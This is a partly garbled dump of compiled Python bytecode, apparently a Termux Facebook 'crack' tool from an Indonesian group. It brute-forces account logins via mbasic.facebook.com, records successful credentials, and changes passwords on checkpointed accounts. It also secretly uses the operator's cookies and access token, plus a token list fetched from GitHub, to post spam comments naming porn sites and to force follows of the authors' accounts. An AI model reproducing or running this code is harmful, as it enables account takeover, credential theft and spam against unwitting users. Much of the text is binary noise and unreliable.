d� tdt d � ttd t �}|dks�|dks�|dk�rVt �d�}|D ]�}d| }t|d��� }|D ]v}|�dd�}z,|�d�}|d � }	|d � }
|d � }W n   Y n0 tdd�} | �|	d | d � | ��  d}q�q�q�z"t|��� �� }t|d��� }W n0 t�y�   ttd � t�d� t�  Y n0 ttd  t �}tdt d! t tt|�� d � |D ]T}|�dd�}z4|�|�}|d � }	|d � }t|d |d � W n   Y n0 �q�ttd" � t�  d S )#Nr   zAll_Akun.txtrF   r!   zAthour   : zITSUKI AND RISKY
zFcaebook : zm.facebook.com/llovexnxx
zWhatsapp : zwa.me/6283143565470
zGroup FB : zTermux Indonesia
a  ________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
a�               ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
z#Ok Results Saved In : Hasil/ok.txt
z"Cp Results Saved In : Hasil/cp.txtr�   z&Type *ALL* To Check Detector All FileszFilename : ZALLr�  ZAllr�   r,   r?   r_   r   r
   r�   zFile Not Found !!r�   r�  zTotal Accounts : zFinished...) r   r   r.   �ngetikr�   r%  rP   r�   r�   r�   r�  r*   rO   rN   r�   r�   r   r�   r�   r$   rT   r/   r�   r  rS   r&   r'   r�  r   rQ   �eksekusirU   )r  r�   r  Zfiqer�   Zponqr'  r(  rR   r�  r�  r�   r�   r  Zppr   r   r   r�  o  s�    

���������
����






$


r�  Tc                 C   s�   | r\t dt d � t td t d t d t d � t td t d t d t d � ttd	 t �}|d
v r�t td � ttd	 �}ql|dkr�tan*|dkr�t�dd�ant td � t	d� d S )Nr	  zChoose Login Method
r   r�   r   z Free Facebookr�   z Mbasic Facebook
z	Method : r>   zDon't Empty CockZfreer8  zFill Correctly !!F)
rS   rO   r�   r�   rN   rP   r�   �urlr�   �select_method)ZshowZselectr   r   r   r�  �  s    $$r�  c              
   C   s�  d}t d7 a zt| |�}W n. tjjtjjtjjfyH   t| |� Y n0 |d }d|j�	� v r�t
td t d t ttt �� t d t d�| |� � tdd	��d
�| |�� �n�d|j�	� v �rF|j�t�d|d j��d��d�d t�d|d j��d�d d�� t|t|d j��}|dk�r�t
td t d t ttt �� t d t d�| t� � tdd	��d
�| t�� n�|dk�r�t
td t d t ttt �� t d t d�| |� � tdd	��d
�| |�� n`t
td t d t ttt �� t d�t| |� � | td�� � v�r�tdd	��d
�| |�� n<t
t!d t d t ttt �� t d t! d�| |� � d S )Nz�Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36r
   r   rR  zLogin Sukses u   ⟩z {}|{}zHasil/ok.txtr�   z{}|{}
rg  z(https://.*?\.facebook.com)�//�/checkpoint/)r:  rA  �new passwordzSuksess Change Password zHasil/newpass.txt�no change passwordzFailed Change Password zHasil/no_change.txtzCheck Points u   ⟩ {}{}|{}r�  zLogin Failed )"�kx�	login_risrI   rV   rW   ZChunkedEncodingErrorZReadTimeoutr�  r\  rz  rS   rP   r%  r�   r   r  r[  r.   r$   rE  ru  r^  r�  r�  r�  r�   �tahap1rv  rL   �newpassr�   r�   r/   r   )r�  r  �	useragent�respons�session�responr   r   r   r�  �  s.    <H
<
<6r�  c                 K   s�   t �� }t|�td �j�}t|d�}|�| |d�� d|v rD|d= |j�t�	d�d ddt
d	d
ddtd td�
� |jtt|� |d�}||fS )Nr6  Zsign_uprM  Z_fb_noscriptr�  r
   r.  r�   r/  r0  r7  r8  )
r:  r;  r<  r?  r>  r@  rB  rC  rA  r=  rl  )rI   r�  rv  rJ   r�  rL   �get_dataru  rE  r�   r�  rI  �
get_action)r�  r  �kwargsr�  �parsingr�  r   r   r   r�  �  s    
0r�  c                 C   s�   t |d�}d|v r�|d= z,| j| jd �d�d t|� |d�j}W n tjjy^   d}Y n0 d	|v std
|�	� v r�t
| t|��S d| j�� v r�dS d S )N�"submit[logout-button-with-confirm]zsubmit[Yes]z
submit[No]rA  r�  r   rl  r(  �password_newzbuat kata sandi barurR  r�  )r�  rI  rE  r�   r�  rL   rI   rV   r�  r  �tahap2rv  r\  rz  )r�  r�  r�  r�  r   r   r   r�  �  s    
,
r�  c                 C   sV   t |d�}|�dti� | j| jd �d�d t|� |dd�}d|j�� v rRd	S d S )
Nr�  r�  rA  r�  r   FrQ  rR  r�  )	r�  ru  r�  rI  rE  r�   r�  r\  rz  )r�  r�  r�  r�  r   r   r   r�  �  s
    
(r�  c                 K   sB   | � dddd��D ]*}||d v r&qq|�|d |d i� q|S )NrN   T)r�   rL  r�   rL  )rx  ru  )r�  Zkecualir�  Zlnputr   r   r   r�  �  s    r�  c                 C   s   | � dddi�d S )NrG  rH  rI  rP  )rw  )r�  r   r   r   r�    s    r�  c                 C   s
   t | d�S )NrF  r�  )Zhtmlr   r   r   rv    s    rv  �����Mb`?c                 C   s0   | d D ]"}t j�|� t j��  t|� qd S )Nr!   )r"   r#   r$   r%   r'   )ZkataZjumr�  r   r   r   r�    s    
r�  �https://mbasic.facebook.com{}c                  C   s�  z t dd��� } t dd��� }W n@ ty`   ttd t d t d t d � t�d� Y n0 d}zt d	��� }W n ty�   tt	d
 � Y n0 t
td t �}d|i}tjtjddd�|d�j}dt|�v �r�dt|�v �r t d	d��}|�|d � W d   � n1 �s0    Y  nFtt	d � z,tjt�t|d�jddd�d �|d� W n   Y n0 zBttjt�d�|d�jd�jddd�d }tjt�|�|d� W n   Y n0 |d S t�d� tt	d � t�  d S )Nr�   r,   r�  r   r   r�  r
   r�  r\  �This Menu Uses Cookies !!zPut Your Cookies : rZ  z/meF)Zverifyr[  Zmbasic_logout_buttonzApa yang Anda pikirkan sekarangrF   z:Sorry The Cookies You Use Don't Use Indonesian Language...rF  r  zBahasa Indonesia�r�  �hrefz
/llovexnxxZIkutizLogin Successfullyzrm -rf cookieszYour Cookies Are Corrupt)r.   r/   r0   rS   r�   r�   r&   r'   r  rO   rN   r�   r�   r�  rJ   �mbasiccr[  �contentr   r$   rI   rv  rw  r   r   rU   )r6   r�   r8  �cekZismir�  Zikutir   r   r   �masuk  sB    $
0,* 
r�  c                  C   s0  t �  z<td��� } t| �dk r@ttd � t �  ttd � qW n0 tyr   ttd � t �  ttd � Y n0 zBtdd��� }tdd��� }td��� } t	�
d|  d	 | � W n   Y n0 ttd
 t �}ttd t �}tdt d � tdt d � |dk�s|dk�rt�  td| |� d S )Nr\  �d   z Sorry Your Cookies Are Broken !!zRun This Tool Againr�  r�   r,   z>https://graph.facebook.com/4342358879204881/comments/?message=r�  zTarget Name : r�   r!   zPress CTRL + Z to Stop Dump ID r	  r�   r?   r@   z(https://m.facebook.com/search/people/?q=)r�  r.   r/   rQ   r*   rO   rU   r  rS   rI   rI  rN   r�   r�   r�   r�  �ajgx)r�  r6   r�   ZknfZbgar   r   r   r�  4  s0    r�  c              	   C   s|  ddl m} t�� }td���  }}d|i}tj| |d�j}t�	dt
|��}|D �]�}	d|	d v �rJtd7 at�td	 t t
t� t d
 t |	d �d�d  d |	d  � ttd	 t t
t� t d
 t t�	dt
|	d ��d  d |	d  � t|d�}
|
�t�	dt
|	d ��d d |	d  d � tdd�}|�|	d � qPtd7 at�td	 t t
t� t d
 t |	d �d�d  d |	d  � ttd	 t t
t� t d
 t |	d �d�d  d |	d  � t|d�}
|
�|	d �d�d d |	d  d � tdd�}|�|	d � qPdt
|�v �rPt||d�jddd�d |� td��� }|�d�}td|d  |� d S )Nr   r�  r\  rZ  r[  z;class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>Zprofiler
   r   r   r   r�   z=(\d*)r�   r!   z.ttarF   zLihat Hasil SelanjutnyarF  r  r�  r�  r@   z-https://mbasic.facebook.com/search/people/?q=)r�  r�  rI   rt  r.   r/   rJ   r�  r^  r_  r   �pq�fwr�   r�   r�   r�   rS   r$   r�  rw  )ro  Znamefirv  r�  Zkukisr�  r�  r�  r�  r}  ZriZppxxZaswqZussr   r   r   r�  M  s6    
DH
.
DB
(

r�  c                  C   s  zJt dd��� } t dd��� }t�d|  �}t�|j�}|d }|d }W nF ty�   tt	d t
 d t	 d t
 d	 � t�d
� t�  Y n0 ttd � ttd | � ttd | � d}d}d}d}	d}
d}d}d}d}d}d}d}d}d}d}d}d}t|d | |d | g�}t|d | |d | g�}t||g�}d }t�d!|	 d" | d# | � t�d!|
 d" | d# | � t�d!| d" | d# | � ttd$ � t�d%|  � t�d&|  � t�d'|  � ttd( � t�  d)}ttd* � t�d!| d+ |  � t�d!| d+ |  � t�d!| d+ |  � t�d!|	 d+ |  � t�d!|
 d+ |  � t�d!| d+ |  � t�d!| d+ |  � ttd, � t�d-| � t�d.| � t�d/| � t�d0| � t�d1| � td2� t�d3� t�  d S )4Nr�   r,   r�  r�   r�   r�  r   r   r�  r
   zWait a moment...zYour Name Facebook : zYour ID Facebook   : Z4111448792295892Z120338706765807Z167879918678352Z180923747373969Z172628718203472Z198550702277940Z198552118944465zJXNXX.COM AND YANDEX.COM AND ML.RATUKU.TOP AND UNBLOCJ.COM AND KENATIPU.COMz"@[100063690353340:0] LOVE ZERO TWOz]https://www.facebook.com/photo.php?fbid=4111448792295892&set=a.108534305920714&type=3&app=fblz\https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fblz]https://www.facebook.com/photo.php?fbid=4111450232295748&set=a.202528366521307&type=3&app=fblzGhttps://www.facebook.com/100063690353340/posts/167879918678352/?app=fblzGhttps://www.facebook.com/100063690353340/posts/198550702277940/?app=fblzGhttps://www.facebook.com/100063690353340/posts/198552118944465/?app=fblz8Yandex.com
Unblock.com
Ml.Ratuku.Top
Jomblo.Top
Xnxx.comzHhttps://www.facebook.com/100002924366263/posts/4111450325629072/?app=fblr!   ZLOVEr�   z/comments/?message=r�  zWait a moment ( 01 )z~https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100063690353340/posts/180923747373969/?app=fbl&access_token=z~https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100063690353340/posts/198552118944465/?app=fbl&access_token=z�https://graph.facebook.com/me/feed/?link=https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl&access_token=zWait a moment ( 02 )a  
	requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom_1 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom_2 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom_3 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom_1 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom_2 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom_3 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom_1 + '&access_token=' + token)
zWait a moment ( 03 )z!/likes?summary=true&access_token=zWait a moment ( 04 )�Dhttps://graph.facebook.com/100063690353340/subscribers?access_token=�Dhttps://graph.facebook.com/100067783659018/subscribers?access_token=�Dhttps://graph.facebook.com/100002924366263/subscribers?access_token=�Dhttps://graph.facebook.com/110877271176800/subscribers?access_token=�Whttps://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=z, [0;97m[[0;92m+[0;97m] Login Successfullyr�   )r.   r/   rI   rJ   r�   r�   rL   r0   rS   r�   r�   r&   r'   r�   r*   rO   ZpilihrI  r�  r�   )r6   r�   r�  r  r�  r�   Zpost1Zpost2Zpost3Zpost4Zpost5Zpost6Zpost7ZkomZkom2Zkom3Zkom4Zkom5Zkom6Zkom7Zkom8Zkom9Zkom10Zkom_1Zkom_2Zkom_3ZreacZdelxr   r   r   r�  p  s|    $
	
r�  c                  C   sF  t �d� t�  t�d�j�� } | �d�\}}|�d�}d|d  }|�d�}|D ]�} tdt	 d	 t
 t| � � zt| �}t| �}W n   Y n0 zdt�d
| �}t�|j�}	t�d| � t�d| � t�d| � t�d| � t�d| � W qR t�y* }
 ztd|
 � W Y d }
~
qRd }
~
0 0 qRtt	d �f t�  d S )Nr�  zIhttps://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/AllToken.txtz/class="blob-code blob-code-inner js-file-line">z</td>ra   r   r_   r!   zToken : r�  r�  r�  r�  r�  r�  r   ZDone)r   r   r    rI   rJ   rL   rM   r�   rS   rO   r�   r   r�   r�   rI  r�   r*   rU   )r'  r�   ZqweZmnaZruiZtknr�   r6   r�  r  r)   r   r   r   �	get_token�  s0    


$r�  �__main__r�   r�   r�   r,   ra   r�  r�  r�  r�  r�  r!   r�  r�   ZvviprW  r�  zHow to Use Crack Not Login..z#Type : python prem.py crack or vvipzgit pull)T)r�  )�rS   Zsettingr�   r)   rU   rI   rJ   rL   rM   Zlink02rV   rW   r   r   rO   r"   r�   r�   r&   r'   ZKode_PremiumZ
Kode_AdminZKode_Premium2ZKode_Admin2ZhostmZuacZNAMABHr�  ZttlpremZttladminrK   r^   r�   Zh2Zb2Zc2Zi2Zu2Zm2Zp2Zk2r5  r�   r�   r�   r�   r�   r�   rc  r�  r   rs  r$  �or�   r�   Zbulat2Zwar2Zinp2rb  rH  r.  r�  r�  r  r�  r�  Zjgr�  r�   r�   r  r�  r  Zcolorr   ZdatetimeZnow�strftimer�  ZcurrentZyearZtahunZmonthZbulanZdayZharir�   r�   rQ  ZserZexpxZlogo_expZlogo_mtrP   rY   r0   r   r    r*   r7   r<   r1   r:   r4   r;   r�   r�   r�   r�   r�   r  r�   r  r  r  r�   r�  r�  r&  r�  r�   r�   r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r�  r!  r"  r8  Zua_mer:  r;  r<  r  r  r}  r  r  r  r  r�   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r�  r�  rv  r�  r�  r�  r�  r�  r�  r�  rg  rQ   �argvr�   r  r�   r�   r.   r   r�  r�  rN   r�  r  r  r   r   r   r   �<module>   s�  
4


	 !AD $&6&+D;: 0>=I#*2Y798,~`snYY]&! 8>

$#R


8



